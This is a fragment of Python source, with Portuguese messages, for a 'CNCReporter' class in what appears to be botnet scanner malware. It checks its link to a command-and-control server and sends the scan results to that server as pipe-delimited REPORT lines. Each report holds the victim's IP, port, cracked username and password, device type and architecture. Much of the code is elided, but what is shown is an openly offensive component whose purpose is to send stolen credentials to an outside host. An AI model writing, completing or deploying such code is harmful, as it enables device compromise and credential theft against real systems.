...
class CNCReporter:
    ...
    def _test_cnc_connection(self):
        try:
            ...
            if b"OK" in response or b"HELLO" in response:
                ...
                print(f"{GREEN}[CNC] Conexão bem sucedida com {self.cnc_ip}:{self.cnc_port}")
                return True
        except:
            pass
        
        print(f"{YELLOW}[CNC] Conexão falhou, tentando reconectar...")
        return False
    ...
    def _report_worker(self):
        while self.running:
            try:
                ...
                if not result or result.confidence < 75:
    ...
    def _send_to_cnc(self, result: ScanResult) -> bool:
        try:
            ...
            report_data = f"REPORT|{result.scanner_type}|{result.ip}|{result.port}|{result.credentials[0] if result.credentials else 'N/A'}|{result.credentials[1] if result.credentials else 'N/A'}|{result.confidence}|{result.device_type}|{result.architecture}\n"
